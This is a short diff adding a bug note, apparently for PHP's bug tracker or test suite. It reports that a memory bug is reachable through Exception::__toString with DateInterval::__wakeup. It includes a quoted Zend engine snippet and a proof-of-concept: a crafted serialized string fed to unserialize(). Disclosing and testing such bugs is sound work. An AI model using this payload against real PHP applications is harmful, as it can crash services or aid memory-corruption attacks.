@@ -1,0 +1,18 @@
+The similar bug can be also triggered via Exception::__toString with DateInterval::__wakeup
+
+```
+ZEND_METHOD(exception, __toString)
+{
+...
+	zend_update_property_str(base_ce, exception, "string", sizeof("string")-1, str);
+```
+
+PoC:
+```
+<?php
+
+$poc = 'O:9:"Exception":2:{S:17:"\00Exception\00string";R:1;i:0;O:12:"DateInterval":1:{s:4:"days";R:1;}}';
+unserialize($poc);
+
+?>
+```
